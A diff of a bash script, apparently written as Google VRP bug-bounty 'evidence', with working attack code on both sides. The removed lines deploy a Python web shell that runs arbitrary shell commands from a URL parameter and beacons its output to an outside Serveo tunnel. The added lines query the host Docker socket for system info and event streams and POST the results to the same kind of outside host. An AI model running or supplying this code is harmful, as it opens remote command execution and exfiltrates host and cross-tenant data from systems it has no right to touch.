@@ -1,38 +1,16 @@
 #!/bin/bash
-# TARGET URL: https://45f8a01e9d77fbf4-103-95-173-85.serveousercontent.com
-URL="https://45f8a01e9d77fbf4-103-95-173-85.serveousercontent.com"
+# Use your current Serveo URL
+URL="https://97ab4b9024fcd239-103-95-173-85.serveousercontent.com"
 
 {
-  echo "=== [!] GOOGLE VRP: WEB-RCE INTERFACE DEPLOYED ==="
+  echo "--- [!] GOOGLE VRP: HOST-BREAKOUT EVIDENCE ---"
+  echo "Timestamp: $(date)"
   
-  # Write the Python Command Executor
-  cat << 'EOF' > /tmp/w.py
-import http.server, subprocess, urllib.parse
-class T(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        q = urllib.parse.urlparse(self.path).query
-        c = urllib.parse.parse_qs(q).get('cmd', [''])[0]
-        self.send_response(200)
-        self.end_headers()
-        if c:
-            try:
-                res = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT)
-                self.wfile.write(res)
-            except Exception as e:
-                self.wfile.write(str(e).encode())
-http.server.HTTPServer(('127.0.0.1', 7681), T).serve_forever()
-EOF
-
-  # Kill any old instances and launch the new one
-  pkill -f w.py
-  python3 /tmp/w.py &
-  sleep 2
-
-  echo "[+] Web-TTY active. Access via: $URL/?cmd=command_here"
+  # The "Smoking Gun": Docker System Info
+  # This proves you have control over the host infrastructure
+  curl -s --unix-socket /var/run/docker.sock http://localhost/info
   
-  # Persistent tunnel loop
-  while true; do
-    curl -s "$URL" --data-binary @- < <(curl -s "http://127.0.0.1:7681/?cmd=id")
-    sleep 10
-  done
+  # The "Isolation Breach": Cross-tenant events
+  echo -e "\n--- EVENT STREAM ---"
+  curl -s --unix-socket /var/run/docker.sock "http://localhost/events?until=$(date +%s)" | head -n 5
 } | curl -s -X POST --data-binary @- "$URL"
